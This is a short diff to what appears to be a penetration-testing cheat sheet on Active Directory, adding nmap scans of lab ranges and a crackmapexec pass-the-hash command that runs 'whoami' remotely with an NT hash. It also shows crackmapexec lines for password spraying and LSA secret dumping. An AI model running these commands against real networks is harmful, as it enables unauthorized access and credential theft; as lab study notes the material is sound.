@@ -1510,6 +1510,11 @@ The command completed successfully.
 ## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
 
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
+#### nmap
+````
+nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
+nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
+````
 #### Traditional Approach
 ````
 net user #users on current computer
@@ -1689,6 +1694,7 @@ Address: 10.11.1.121
 ````
 crackmapexec smb 10.11.1.120-124 -u Daisy -p XorPasswordIsDead17 -d xor.com -x whoami #change smb to other services
 crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
+crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
 ````
 #### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
